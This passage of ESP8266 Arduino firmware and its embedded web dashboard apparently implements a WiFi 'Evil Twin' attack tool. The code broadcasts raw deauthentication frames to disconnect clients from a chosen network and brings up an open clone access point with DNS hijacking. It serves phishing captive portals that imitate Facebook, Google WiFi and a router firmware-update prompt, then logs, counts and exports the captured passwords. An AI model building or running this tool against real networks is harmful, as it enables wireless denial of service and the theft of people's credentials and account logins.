        console.error("Error fetching logs:", error);
        showNotification('Failed to load logs!', 'error');
    }
}

function renderPasswordLogs() {
    const passwordLogsDiv = document.getElementById('password-logs');
    passwordLogsDiv.innerHTML = '';
    if (capturedPasswords.length === 0) {
        passwordLogsDiv.innerHTML = '<div class="text-gray-400 text-sm">No passwords captured yet...</div>';
    } else {
        capturedPasswords.forEach(logEntry => {
            passwordLogsDiv.innerHTML += `<div class="mb-2 p-2 bg-slate-700 rounded text-sm">${logEntry}</div>`;
        });
    }
    passwordLogsDiv.scrollTop = passwordLogsDiv.scrollHeight;
    document.getElementById('password-count').textContent = capturedPasswords.length;
}

async function clearLogs() {
    if (confirm('Are you sure you want to clear all password logs?')) {
        try {
            const response = await fetch('/api/clear_logs', { method: 'POST' });
            if (!response.ok) {
                throw new Error(`HTTP error! status: ${response.status}`);
            }
            const result = await response.json();
            addToTerminal(`[INFO] ${result.message}`);
            showNotification('Password logs cleared!', 'success');
            fetchLogs(); // Refresh logs
        } catch (error) {
            addToTerminal(`[ERROR] Failed to clear logs: ${error.message}`);
            console.error("Error clearing logs:", error);
            showNotification('Failed to clear logs!', 'error');
        }
    }
}

function downloadLogs() {
    addToTerminal('[INFO] Downloading password logs...');
    window.open('/api/download_logs', '_blank'); // Open in new tab to trigger download
    showNotification('Password logs download initiated!', 'info');
}

// --- New: Settings Functions ---
async function fetchSettings() {
    try {
        const response = await fetch('/api/settings');
        if (!response.ok) {
            throw new Error(`HTTP error! status: ${response.status}`);
        }
        appSettings = await response.json();
        renderSettings();
        addToTerminal('[INFO] Settings fetched successfully.');
    } catch (error) {
        addToTerminal(`[ERROR] Failed to fetch settings: ${error.message}`);
        console.error("Error fetching settings:", error);
        showNotification('Failed to load settings!', 'error');
    }
}

function renderSettings() {
    document.getElementById('admin-ap-ssid').value = appSettings.adminApSsid || '';
    document.getElementById('admin-ap-password').value = appSettings.adminApPassword || '';
    document.getElementById('enable-debug-logs').checked = appSettings.enableDebugLogs || false;
    document.getElementById('default-captive-template').value = appSettings.defaultCaptivePortalTemplate || 'default';
}

async function saveSettings() {
    const newSettings = {
        adminApSsid: document.getElementById('admin-ap-ssid').value,
        adminApPassword: document.getElementById('admin-ap-password').value,
        enableDebugLogs: document.getElementById('enable-debug-logs').checked,
        defaultCaptivePortalTemplate: document.getElementById('default-captive-template').value
    };

    try {
        addToTerminal('[INFO] Saving settings...');
        const response = await fetch('/api/settings', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(newSettings)
        });

        if (!response.ok) {
            throw new Error(`HTTP error! status: ${response.status}`);
        }
        const result = await response.json();
        addToTerminal(`[INFO] ${result.message}`);
        showNotification('Settings saved successfully!', 'success');
        // Re-fetch settings to ensure UI is in sync after potential AP restart
        setTimeout(fetchSettings, 3000); // Give ESP time to restart AP if needed
    } catch (error) {
        addToTerminal(`[ERROR] Failed to save settings: ${error.message}`);
        console.error("Error saving settings:", error);
        showNotification('Failed to save settings!', 'error');
    }
}

// <--- TAMBAHAN BARU: Fungsi Deselect Network
async function deselectNetwork() {
    if (!selectedNetwork) {
        showNotification('No network is currently selected.', 'info');
        return;
    }

    if (confirm('Are you sure you want to deselect the current network and stop all attacks?')) {
        try {
            const response = await fetch('/api/deselect_network', { method: 'POST' });
            if (!response.ok) {
                throw new Error(`HTTP error! status: ${response.status}`);
            }
            const result = await response.json();
            selectedNetwork = null; // Clear selected network in UI state
            isDeauthActive = false; // Update UI state
            isHotspotActive = false; // Update UI state
            updateDeauthUI(); // Refresh UI
            updateHotspotUI(); // Refresh UI
            document.getElementById('target-ssid').textContent = 'None Selected'; // Update dashboard
            renderNetworks(); // Re-render scanner list to remove selection highlight
            addToTerminal(`[INFO] ${result.message}`);
            showNotification('Network deselected successfully!', 'success');
        } catch (error) {
            addToTerminal(`[ERROR] Failed to deselect network: ${error.message}`);
            console.error("Error deselecting network:", error);
            showNotification('Failed to deselect network!', 'error');
        }
    }
}
// TAMBAHAN BARU END --->


// --- Utility Functions ---
function addToTerminal(message) {
    const terminal = document.getElementById('terminal');
    const systemLogs = document.getElementById('system-logs'); // Assuming system-logs also exists
    const timestamp = new Date().toLocaleTimeString();
    const logEntry = `<div>[${timestamp}] ${message}</div>`;
    
    terminal.innerHTML += logEntry;
    if (systemLogs) systemLogs.innerHTML += logEntry; // Add to system logs too
    
    terminal.scrollTop = terminal.scrollHeight;
    if (systemLogs) systemLogs.scrollTop = systemLogs.scrollHeight;
}

function showNotification(message, type = 'info') {
    const notification = document.createElement('div');
    notification.className = `fixed top-4 right-4 z-50 p-4 rounded-lg text-white transition-all duration-300 ${
        type === 'success' ? 'bg-green-600' :
        type === 'error' ? 'bg-red-600' :
        'bg-blue-600'
    }`;
    notification.textContent = message;
    
    document.body.appendChild(notification);
    
    setTimeout(() => {
        notification.remove();
    }, 3000);
}

function debounce(func, wait) {
    let timeout;
    return function executedFunction(...args) {
        const later = () => {
            clearTimeout(timeout);
            func(...args);
        };
        clearTimeout(timeout);
        timeout = setTimeout(later, wait);
    };
}

// --- Status Updates ---
async function startStatusUpdates() {
    setInterval(async () => {
        try {
            const response = await fetch('/api/status');
            if (!response.ok) {
                throw new Error(`HTTP error! status: ${response.status}`);
            }
            const statusData = await response.json();
            
            document.getElementById('target-ssid').textContent = statusData.targetSsid || 'None Selected';
            
            isHotspotActive = statusData.hotspotActive;
            updateHotspotUI(); // Update button and status text
            
            isDeauthActive = statusData.deauthActive;
            updateDeauthUI(); // Update button and status text

            document.getElementById('password-count').textContent = statusData.passwordCount;
            document.getElementById('ip-address').textContent = statusData.ipAddress;
            document.getElementById('mac-address').textContent = statusData.macAddress;
            document.getElementById('uptime').textContent = statusData.uptime;

            const memoryPercent = statusData.memoryUsagePercent.toFixed(0);
            document.getElementById('memory-progress').style.width = `${memoryPercent}%`;
            document.getElementById('memory-percent').textContent = `${memoryPercent}%`;

        } catch (error) {
            console.error("Error fetching dashboard status:", error);
            // addToTerminal(`[ERROR] Failed to update status: ${error.message}`);
        }
    }, 3000); // Update every 3 seconds
}

// --- Generate Report ---
async function generateReport() {
    addToTerminal('[INFO] Generating penetration test report...');
    try {
        const statusResponse = await fetch('/api/status');
        const statusData = await statusResponse.json();

        const logsResponse = await fetch('/api/logs');
        const logsData = await logsResponse.json();

        const filesResponse = await fetch('/api/files');
        const filesData = await filesResponse.json();

        const report = {
            timestamp: new Date().toISOString(),
            deviceInfo: {
                ipAddress: statusData.ipAddress,
                macAddress: statusData.macAddress,
                uptime: statusData.uptime,
                memoryUsage: `${statusData.memoryUsagePercent.toFixed(2)}% (${statusData.freeHeap}/${statusData.totalHeap} bytes free)`,
            },
            targetNetwork: {
                ssid: statusData.targetSsid,
                bssid: statusData.targetBssid,
                channel: statusData.targetChannel
            },
            attackStatus: {
                evilTwin: statusData.hotspotActive ? 'Active' : 'Inactive',
                deauthAttack: statusData.deauthActive ? 'Active' : 'Inactive',
                capturedPasswordsCount: statusData.passwordCount
            },
            capturedPasswords: logsData.passwords.split('\n').filter(line => line.trim() !== ''),
            filesOnDevice: filesData.map(file => ({ name: file.name, size: file.size, type: file.type }))
        };
        
        const blob = new Blob([JSON.stringify(report, null, 2)], { type: 'application/json' });
        const url = URL.createObjectURL(blob);
        const a = document.createElement('a');
        a.href = url;
        a.download = 'sentinelcap_report.json';
        a.click();
        URL.revokeObjectURL(url);
        
        addToTerminal('[INFO] Penetration test report generated and downloaded.');
        showNotification('Report generated and downloaded!', 'success');
    } catch (error) {
        addToTerminal(`[ERROR] Failed to generate report: ${error.message}`);
        console.error("Error generating report:", error);
        showNotification('Failed to generate report!', 'error');
    }
}

// --- Template functions for different captive portals ---
// These are kept in JS as they are client-side templates for the editor
function getFacebookTemplate() {
    return `<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook</title>
    <style>
        body { font-family: Helvetica, Arial, sans-serif; background: #f0f2f5; margin: 0; padding: 20px; }
        .container { max-width: 400px; margin: 50px auto; background: white; padding: 30px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); }
        .logo { color: #1877f2; font-size: 2.5em; font-weight: bold; text-align: center; margin-bottom: 20px; }
        input { width: 100%; padding: 14px; margin: 8px 0; border: 1px solid #ddd; border-radius: 6px; font-size: 16px; box-sizing: border-box; }
        button { width: 100%; background: #1877f2; color: white; padding: 14px; border: none; border-radius: 6px; font-size: 16px; font-weight: bold; cursor: pointer; }
        .wifi-notice { background: #e3f2fd; padding: 15px; border-radius: 6px; margin-bottom: 20px; text-align: center; }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">facebook</div>
        <div class="wifi-notice">
            <strong>WiFi Authentication Required</strong><br>
            Please log in to access {SSID} network
        </div>
        <form action="/submit_password" method="post">
            <input type="text" name="username" placeholder="Email or phone number" required>
            <input type="password" name="password" placeholder="Password" required>
            <button type="submit">Log In</button>
        </form>
    </div>
</body>
</html>`;
}

function getGoogleTemplate() {
    return `<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Google WiFi</title>
    <style>
        body { font-family: 'Google Sans', Roboto, Arial, sans-serif; background: #f8f9fa; margin: 0; padding: 20px; }
        .container { max-width: 450px; margin: 50px auto; background: white; padding: 40px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
        .logo { text-align: center; margin-bottom: 30px; }
        .logo img { width: 80px; }
        h1 { color: #202124; font-size: 24px; font-weight: 400; text-align: center; margin-bottom: 30px; }
        .network-info { background: #f1f3f4; padding: 15px; border-radius: 8px; margin-bottom: 20px; }
        input { width: 100%; padding: 16px; margin: 8px 0; border: 1px solid #dadce0; border-radius: 4px; font-size: 16px; box-sizing: border-box; }
        input:focus { outline: none; border-color: #1a73e8; }
        button { width: 100%; background: #1a73e8; color: white; padding: 16px; border: none; border-radius: 4px; font-size: 16px; font-weight: 500; cursor: pointer; margin-top: 16px; }
        button:hover { background: #1557b0; }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">
            <div style="font-size: 40px;">🌐</div>
        </div>
        <h1>Connect to WiFi</h1>
        <div class="network-info">
            <strong>Network:</strong> {SSID}<br>
            <strong>Security:</strong> WPA2-Personal
        </div>
        <form action="/submit_password" method="post">
            <input type="password" name="password" placeholder="Enter network password" required>
            <button type="submit">Connect</button>
        </form>
    </div>
</body>
</html>`;
}

function getRouterTemplate() {
    return `<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Router Configuration</title>
    <style>
        body { font-family: Arial, sans-serif; background: #f4f4f4; margin: 0; padding: 20px; }
        .container { max-width: 500px; margin: 30px auto; background: white; border-radius: 5px; overflow: hidden; box-shadow: 0 2px 5px rgba(0,0,0,0.1); }
        .header { background: #2c3e50; color: white; padding: 20px; text-align: center; }
        .content { padding: 30px; }
        .warning { background: #fff3cd; border: 1px solid #ffeaa7; color: #856404; padding: 15px; border-radius: 4px; margin-bottom: 20px; }
        .form-group { margin-bottom: 20px; }
        label { display: block; margin-bottom: 5px; font-weight: bold; color: #333; }
        input, select { width: 100%; padding: 12px; border: 1px solid #ddd; border-radius: 4px; font-size: 16px; box-sizing: border-box; }
        button { width: 100%; background: #3498db; color: white; padding: 14px; border: none; border-radius: 4px; font-size: 16px; cursor: pointer; }
        button:hover { background: #2980b9; }
        .device-info { background: #ecf0f1; padding: 15px; border-radius: 4px; margin-bottom: 20px; font-size: 14px; }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>🔧 Router Configuration</h1>
            <p>Firmware Update Required</p>
        </div>
        <div class="content">
            <div class="warning">
                <strong>Security Alert:</strong> Your router firmware is outdated. Please authenticate to install critical security updates.
            </div>
            <div class="device-info">
                <strong>Device:</strong> {SSID}<br>
                <strong>Model:</strong> Wireless Router AC1200<br>
                <strong>Current Version:</strong> 2.1.0<br>
                <strong>Available Version:</strong> 2.1.5 (Security Update)
            </div>
            <form action="/submit_password" method="post">
                <div class="form-group">
                    <label for="username">Administrator Username:</label>
                    <input type="text" id="username" name="username" value="admin" required>
                </div>
                <div class="form-group">
                    <label for="password">Administrator Password:</label>
                    <input type="password" id="password" name="password" placeholder="Enter admin password" required>
                </div>
                <button type="submit">Authenticate & Update Firmware</button>
            </form>
        </div>
    </div>
</body>
</html>`;
}
)rawliteral";


// --- Setup Function ---
void setup() {
  Serial.begin(115200);
  Serial.println("\n[INFO] Starting " APP_NAME "...");

  // SPIFFS is still used for file upload/delete and potentially for dynamic captive portal templates
  // but the main UI files are now embedded.
  if (!SPIFFS.begin()) {
    Serial.println("[ERROR] SPIFFS Mount Failed! Formatting...");
    SPIFFS.format(); // Try formatting if mount fails
    if (!SPIFFS.begin()) {
      Serial.println("[FATAL] SPIFFS Mount Failed after format. Aborting.");
      while(true); // Halt execution
    }
    Serial.println("[INFO] SPIFFS formatted and mounted successfully.");
  } else {
    Serial.println("[INFO] SPIFFS mounted successfully.");
  }

  FSInfo fs_info;
  SPIFFS.info(fs_info);
  Serial.printf("[INFO] SPIFFS Total: %u bytes, Used: %u bytes\n", fs_info.totalBytes, fs_info.usedBytes);

  // --- Load settings at startup ---
  loadSettings(); // Call the new loadSettings function

  WiFi.mode(WIFI_AP_STA); // AP_STA mode for admin AP and scanning
  // Use settings for AP configuration
  WiFi.softAPConfig(apIP, apIP, IPAddress(255, 255, 255, 0));
  WiFi.softAP(appSettings.adminApSsid.c_str(), appSettings.adminApPassword.c_str()); // Use loaded settings
  Serial.print("[INFO] Admin AP '" + appSettings.adminApSsid + "' started with IP: ");
  Serial.println(WiFi.softAPIP());

  dnsServer.start(DNS_PORT, "*", apIP);
  Serial.println("[INFO] DNS Server started.");

  // Enable promiscuous mode for deauthentication
  wifi_promiscuous_enable(1);

  // --- Web Server Routes ---
  // Serve embedded static files
  webServer.on("/", HTTP_GET, []() { webServer.send(200, "text/html", INDEX_HTML); });
  webServer.on("/style.css", HTTP_GET, []() {
    Serial.println("[INFO] Serving /style.css"); // Log when CSS is requested
    webServer.send(200, "text/css", STYLE_CSS);
  });
  webServer.on("/script.js", HTTP_GET, []() { webServer.send(200, "application/javascript", SCRIPT_JS); });
  
  // API Endpoints (JSON responses)
  webServer.on("/api/scan", handleApiScan);
  webServer.on("/api/select_network", HTTP_POST, handleApiSelectNetwork);
  webServer.on("/api/toggle_deauth", HTTP_POST, handleApiToggleDeauth);
  webServer.on("/api/toggle_hotspot", HTTP_POST, handleApiToggleHotspot);
  webServer.on("/api/mass_spoofing", HTTP_POST, handleApiMassSpoofing);
  webServer.on("/api/status", handleApiStatus);
  webServer.on("/api/logs", handleApiLogs);
  webServer.on("/api/clear_logs", HTTP_POST, handleApiClearLogs);
  webServer.on("/api/download_logs", handleApiDownloadLogs);
  webServer.on("/api/files", handleApiFiles); // New API for file listing
  webServer.on("/api/deselect_network", HTTP_POST, handleApiDeselectNetwork); // <--- TAMBAHAN BARU

  // New: Settings API Endpoints
  webServer.on("/api/settings", HTTP_GET, handleApiGetSettings);
  webServer.on("/api/settings", HTTP_POST, handleApiSaveSettings);

  // File Upload/Delete (still uses SPIFFS)
  webServer.on("/upload", HTTP_POST, []() { webServer.send(200, "text/plain", ""); }, handleFileUpload);
  webServer.on("/deletefile", HTTP_POST, handleFileDelete);

  // Captive Portal (for clients connecting to the Evil Twin)
  webServer.on("/generate_captive_portal", handleCaptivePortal);
  webServer.on("/submit_password", HTTP_POST, handleCaptivePortalSubmit);

  // System Control
  webServer.on("/restart", HTTP_POST, handleRestart); // Changed to POST for security

  // Catch-all for unknown paths (redirect to captive portal if active, otherwise 404)
  webServer.onNotFound(handleNotFound);

  webServer.begin();
  Serial.println("[INFO] HTTP server started.");

  performScan(); // Initial scan
  startTime = millis(); // Initialize uptime counter
}

// --- Loop Function ---
void loop() {
  dnsServer.processNextRequest();
  webServer.handleClient();

  // Deauthentication attack logic
  if (deauthing_active && _selectedNetwork.ssid != "" && millis() - lastDeauthTime >= 1000) {
    Serial.println("[DEAUTH] Sending deauth packets to " + _selectedNetwork.ssid);
    wifi_set_channel(_selectedNetwork.ch);

    // Deauth packet structure (simplified for example)
    // Frame Control (0xC0 for Deauth), Duration (0x0000), Destination (Broadcast), Source (AP), BSSID (AP), Sequence (0x0000), Reason Code (0x0001)
    uint8_t deauthPacket[26] = {0xC0, 0x00, 0x00, 0x00, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // FC, Duration, DA (Broadcast)
                                0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // SA (AP BSSID)
                                0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // BSSID (AP BSSID)
                                0x00, 0x00, // Sequence Control
                                0x01, 0x00}; // Reason Code (Unspecified reason)

    // Copy BSSID into SA and BSSID fields
    memcpy(&deauthPacket[10], _selectedNetwork.bssid, 6); // Source Address (AP)
    memcpy(&deauthPacket[16], _selectedNetwork.bssid, 6); // BSSID (AP)

    // Send deauth from AP to client (broadcast)
    wifi_send_pkt_freedom(deauthPacket, sizeof(deauthPacket), 0);
    
    // Optionally, send disassociation frame from client to AP (broadcast)
    // deauthPacket[0] = 0xA0; // Disassociation frame
    // wifi_send_pkt_freedom(deauthPacket, sizeof(deauthPacket), 0);

    lastDeauthTime = millis();
  }

  // Periodically scan for networks (every 15 seconds)
  if (millis() - lastScanTime >= 15000) {
    performScan();
    lastScanTime = millis();
  }

  // Periodically check WiFi status (every 2 seconds)
  if (millis() - lastWifiStatusCheck >= 2000) {
    // This is mostly for internal logging, UI will fetch status via API
    if (WiFi.status() != WL_CONNECTED) {
      // Serial.println("[INFO] WiFi not connected to any AP.");
    } else {
      // Serial.println("[INFO] WiFi connected to AP: " + WiFi.SSID());
    }
    lastWifiStatusCheck = millis();
  }
}

// --- Helper Functions ---

void clearNetworkArray() {
  for (int i = 0; i < 16; i++) {
    _networks[i] = {"", 0, {0, 0, 0, 0, 0, 0}, 0, ""}; // Reset network struct
  }
}

void performScan() {
  Serial.println("[SCAN] Starting WiFi scan...");
  int n = WiFi.scanNetworks(false, true); // false: not async, true: show hidden
  clearNetworkArray();
  if (n > 0) {
    Serial.print("[SCAN] Found ");
    Serial.print(n);
    Serial.println(" networks.");
    for (int i = 0; i < n && i < 16; ++i) {
      _Network network;
      network.ssid = WiFi.SSID(i);
      for (int j = 0; j < 6; j++) {
        network.bssid[j] = WiFi.BSSID(i)[j];
      }
      network.ch = WiFi.channel(i);
      network.rssi = WiFi.RSSI(i);
      network.security = getSecurityType(WiFi.encryptionType(i));
      _networks[i] = network;
      Serial.printf("[SCAN] %d: %s, Ch: %d, RSSI: %d, BSSID: %s, Security: %s\n",
                    i + 1, network.ssid.c_str(), network.ch, network.rssi,
                    bytesToStr(network.bssid, 6).c_str(), network.security.c_str());
    }
  } else {
    Serial.println("[SCAN] No networks found.");
  }
}

String bytesToStr(const uint8_t* b, uint32_t size) {
  String str;
  const char ZERO = '0';
  const char DOUBLEPOINT = ':';
  for (uint32_t i = 0; i < size; i++) {
    if (b[i] < 0x10) str += ZERO;
    str += String(b[i], HEX);
    if (i < size - 1) str += DOUBLEPOINT;
  }
  return str;
}

String getSecurityType(uint8_t encryptionType) {
  // Using correct ESP8266 encryption type constants
  switch (encryptionType) {
    case ENC_TYPE_NONE: return "Open";
    case ENC_TYPE_WEP: return "WEP";
    case ENC_TYPE_TKIP: return "WPA-PSK";
    case ENC_TYPE_CCMP: return "WPA2-PSK";
    case ENC_TYPE_AUTO: return "WPA/WPA2-PSK";
    default: return "Unknown";
  }
}


// --- File Serving Handlers ---
// This function is now primarily for SPIFFS files, not the embedded ones.
bool handleFileRead(String path) {
  Serial.println("handleFileRead: " + path);
  if (path.endsWith("/")) path += "index.html"; // If path is a directory, serve index.html
  String contentType = "text/plain";
  if (path.endsWith(".html")) contentType = "text/html";
  else if (path.endsWith(".css")) contentType = "text/css";
  else if (path.endsWith(".js")) contentType = "application/javascript";
  else if (path.endsWith(".png")) contentType = "image/png";
  else if (path.endsWith(".gif")) contentType = "image/gif";
  else if (path.endsWith(".jpg")) contentType = "image/jpeg";
  else if (path.endsWith(".ico")) contentType = "image/x-icon";
  else if (path.endsWith(".xml")) contentType = "text/xml";
  else if (path.endsWith(".pdf")) contentType = "application/pdf";
  else if (path.endsWith(".zip")) contentType = "application/zip";
  else if (path.endsWith(".json")) contentType = "application/json"; // Added for JSON files

  if (SPIFFS.exists(path)) {
    File file = SPIFFS.open(path, "r");
    if (file) {
      webServer.streamFile(file, contentType);
      file.close();
      return true;
    }
  }
  return false;
}

void handleNotFound() {
  if (hotspot_active) {
    // If Evil Twin is active, redirect all requests to the captive portal
    webServer.sendHeader("Location", "http://" + apIP.toString() + "/generate_captive_portal", true);
    webServer.send(302, "text/plain", "");
  } else {
    // For non-embedded files, try to serve from SPIFFS, otherwise 404
    if (!handleFileRead(webServer.uri())) { 
        webServer.send(404, "text/plain", "404: Not Found");
    }
  }
}

// --- API Handlers (JSON Responses) ---

void handleApiScan() {
  performScan(); // Perform a fresh scan
  DynamicJsonDocument doc(4096); // Adjust size as needed based on number of networks
  JsonArray networksArray = doc.to<JsonArray>();

  for (int i = 0; i < 16; ++i) {
    if (_networks[i].ssid == "") {
      break;
    }
    // Corrected ArduinoJson usage: use createNestedObject()
    JsonObject networkObj = networksArray.createNestedObject();
    networkObj["ssid"] = _networks[i].ssid;
    networkObj["bssid"] = bytesToStr(_networks[i].bssid, 6);
    networkObj["channel"] = _networks[i].ch;
    networkObj["rssi"] = _networks[i].rssi;
    networkObj["security"] = _networks[i].security;
  }

  String jsonResponse;
  serializeJson(doc, jsonResponse);
  webServer.send(200, "application/json", jsonResponse);
}

void handleApiSelectNetwork() {
  if (webServer.hasArg("plain")) {
    String body = webServer.arg("plain");
    DynamicJsonDocument doc(256);
    DeserializationError error = deserializeJson(doc, body);

    if (error) {
      webServer.send(400, "application/json", "{\"success\": false, \"message\": \"Invalid JSON\"}");
      return;
    }

    String bssidStr = doc["bssid"].as<String>();
    for (int i = 0; i < 16; i++) {
      if (bytesToStr(_networks[i].bssid, 6) == bssidStr) {
        _selectedNetwork = _networks[i];
        Serial.println("[INFO] Selected network: " + _selectedNetwork.ssid);
        webServer.send(200, "application/json", "{\"success\": true, \"message\": \"Network selected\"}");
        return;
      }
    }
    webServer.send(404, "application/json", "{\"success\": false, \"message\": \"Network not found\"}");
  } else {
    webServer.send(400, "application/json", "{\"success\": false, \"message\": \"No data provided\"}");
  }
}

void handleApiToggleDeauth() {
  if (_selectedNetwork.ssid != "") {
    deauthing_active = !deauthing_active;
    Serial.println("[INFO] Deauthentication " + String(deauthing_active ? "started" : "stopped") + " for " + _selectedNetwork.ssid);
    webServer.send(200, "application/json", "{\"success\": true, \"deauth_active\": " + String(deauthing_active ? "true" : "false") + "}");
  } else {
    Serial.println("[WARNING] Cannot toggle deauth: No network selected.");
    webServer.send(400, "application/json", "{\"success\": false, \"message\": \"No target network selected\"}");
  }
}

void handleApiToggleHotspot() {
  if (_selectedNetwork.ssid != "") {
    hotspot_active = !hotspot_active;
    
    // Always disconnect current softAP to ensure clean state before reconfiguring
    dnsServer.stop(); // Stop DNS server first to prevent issues during AP change
    WiFi.softAPdisconnect(true); // Disconnect current AP completely

    if (hotspot_active) {
      // Start Evil Twin AP with selected SSID (no password)
      WiFi.softAPConfig(apIP, apIP, IPAddress(255, 255, 255, 0));
      // IMPORTANT: Evil Twin AP should not have a password to capture credentials
      WiFi.softAP(_selectedNetwork.ssid.c_str()); 
      dnsServer.start(DNS_PORT, "*", apIP); // Restart DNS for Evil Twin
      Serial.println("[INFO] Evil Twin hotspot started for: " + _selectedNetwork.ssid);
    } else {
      // Restart admin AP with configured SSID and password
      WiFi.softAPConfig(apIP, apIP, IPAddress(255, 255, 255, 0));
      WiFi.softAP(appSettings.adminApSsid.c_str(), appSettings.adminApPassword.c_str()); // Restart admin AP using settings
      dnsServer.start(DNS_PORT, "*", apIP); // Restart DNS for admin AP
      Serial.println("[INFO] Evil Twin hotspot stopped. Admin AP restarted.");
    }
    webServer.send(200, "application/json", "{\"success\": true, \"hotspot_active\": " + String(hotspot_active ? "true" : "false") + "}");
  } else {
    Serial.println("[WARNING] Cannot toggle hotspot: No network selected.");
    webServer.send(400, "application/json", "{\"success\": false, \"message\": \"No target network selected\"}");
  }
}

void handleApiMassSpoofing() {
  if (webServer.hasArg("plain")) {
    String body = webServer.arg("plain");
    DynamicJsonDocument doc(1024); // Adjust size based on expected SSID list length
    DeserializationError error = deserializeJson(doc, body);

    if (error) {
      webServer.send(400, "application/json", "{\"success\": false, \"message\": \"Invalid JSON\"}");
      return;
    }

    String ssidList = doc["ssid_list"].as<String>();
    Serial.println("[INFO] Mass SSID Spoofing requested with list:\n" + ssidList);
    // TODO: Implement actual mass spoofing logic here.
    // This is highly complex and might require raw packet injection or cycling APs.
    // For a single ESP, you might cycle through SSIDs or use raw packets.
    webServer.send(200, "application/json", "{\"success\": true, \"message\": \"Mass spoofing initiated (placeholder)\"}");
  } else {
    webServer.send(400, "application/json", "{\"success\": false, \"message\": \"No data provided\"}");
  }
}

void handleApiStatus() {
  DynamicJsonDocument doc(512); // Adjust size as needed
  doc["targetSsid"] = _selectedNetwork.ssid;
  doc["targetBssid"] = bytesToStr(_selectedNetwork.bssid, 6);
  doc["targetChannel"] = _selectedNetwork.ch;
  doc["hotspotActive"] = hotspot_active;
  doc["deauthActive"] = deauthing_active;
  
  // Count captured passwords (simple line count)
  int passwordCount = 0;
  if (_capturedPasswordsLog.length() > 0) {
    for (int i = 0; i < _capturedPasswordsLog.length(); i++) {
      if (_capturedPasswordsLog.charAt(i) == '\n') {
        passwordCount++;
      }
    }
  }
  doc["passwordCount"] = passwordCount;

  doc["ipAddress"] = WiFi.softAPIP().toString();
  doc["macAddress"] = WiFi.softAPmacAddress();
  doc["uptime"] = String((millis() - startTime) / 1000 / 60) + "m";
  doc["freeHeap"] = ESP.getFreeHeap();
  // ESP.getHeapSize() is not available. Use a typical total heap size for percentage calculation.
  // For ESP8266, total heap is typically around 50KB-80KB depending on flash size and partition.
  // Let's use a rough estimate or just report free heap.
  // For a more accurate percentage, you might need to know the total allocatable heap at runtime.
  // For simplicity, we'll just report free heap and a fixed total for percentage.
  const size_t TOTAL_HEAP_ESTIMATE = 80 * 1024; // 80KB, adjust as needed for your board
  doc["totalHeap"] = TOTAL_HEAP_ESTIMATE; // Report an estimated total heap
  doc["memoryUsagePercent"] = (100.0 * (TOTAL_HEAP_ESTIMATE - ESP.getFreeHeap())) / TOTAL_HEAP_ESTIMATE;

  String jsonResponse;
  serializeJson(doc, jsonResponse);
  webServer.send(200, "application/json", jsonResponse);
}

void handleApiLogs() {
  DynamicJsonDocument doc(4096); // Adjust size based on expected log length
  doc["passwords"] = _capturedPasswordsLog;
  // You might add system logs here if you implement a logging buffer
  // doc["systemLogs"] = "Some system log data...";

  String jsonResponse;
  serializeJson(doc, jsonResponse);
  webServer.send(200, "application/json", jsonResponse);
}

void handleApiClearLogs() {
  _capturedPasswordsLog = "";
  Serial.println("[INFO] Password logs cleared.");
  webServer.send(200, "application/json", "{\"success\": true, \"message\": \"Logs cleared\"}");
}

void handleApiDownloadLogs() {
  webServer.sendHeader("Content-Disposition", "attachment; filename=password_log.txt");
  webServer.send(200, "text/plain", _capturedPasswordsLog);
}

void handleApiFiles() {
  DynamicJsonDocument doc(2048); // Adjust size as needed for file list
  JsonArray filesArray = doc.to<JsonArray>();

  Dir dir = SPIFFS.openDir("/");
  while (dir.next()) {
    String fileName = dir.fileName();
    size_t fileSize = dir.fileSize();
    JsonObject fileObj = filesArray.createNestedObject(); // Corrected ArduinoJson usage
    fileObj["name"] = fileName;
    fileObj["size"] = fileSize;
    // Determine file type based on extension
    if (fileName.endsWith(".html")) fileObj["type"] = "html";
    else if (fileName.endsWith(".css")) fileObj["type"] = "css";
    else if (fileName.endsWith(".js")) fileObj["type"] = "javascript";
    else if (fileName.endsWith(".json")) fileObj["type"] = "json";
    else if (fileName.endsWith(".log")) fileObj["type"] = "log";
    else if (fileName.endsWith(".txt")) fileObj["type"] = "text";
    else fileObj["type"] = "unknown";
  }

  String jsonResponse;
  serializeJson(doc, jsonResponse);
  webServer.send(200, "application/json", jsonResponse);
}

void handleApiDeselectNetwork() { // <--- IMPLEMENTASI BARU
  _selectedNetwork = {"", 0, {0, 0, 0, 0, 0, 0}, 0, ""}; // Reset selected network
  deauthing_active = false; // Stop deauth if active
  hotspot_active = false;   // Stop hotspot if active

  // Ensure admin AP is active and correct if Evil Twin was running
  dnsServer.stop();
  WiFi.softAPdisconnect(true);
  WiFi.softAPConfig(apIP, apIP, IPAddress(255, 255, 255, 0));
  WiFi.softAP(appSettings.adminApSsid.c_str(), appSettings.adminApPassword.c_str());
  dnsServer.start(DNS_PORT, "*", apIP);

  Serial.println("[INFO] Network deselected. Deauth and Hotspot stopped.");
  webServer.send(200, "application/json", "{\"success\": true, \"message\": \"Network deselected\"}");
}

// --- File Upload/Delete Handlers ---

void handleFileUpload() {
  HTTPUpload& upload = webServer.upload();
  if (upload.status == UPLOAD_FILE_START) {
    String filename = upload.filename;
    if (!filename.startsWith("/")) filename = "/" + filename;
    Serial.print("[FILE] Uploading: "); Serial.println(filename);
    SPIFFS.remove(filename); // Remove existing file if it exists
    fsUploadFile = SPIFFS.open(filename, "w"); // Open the file in write mode
    if (!fsUploadFile) {
      Serial.println("[ERROR] Failed to open file for writing during upload: " + filename);
      webServer.send(500, "application/json", "{\"success\": false, \"message\": \"Failed to open file for writing.\"}");
      return;
    }
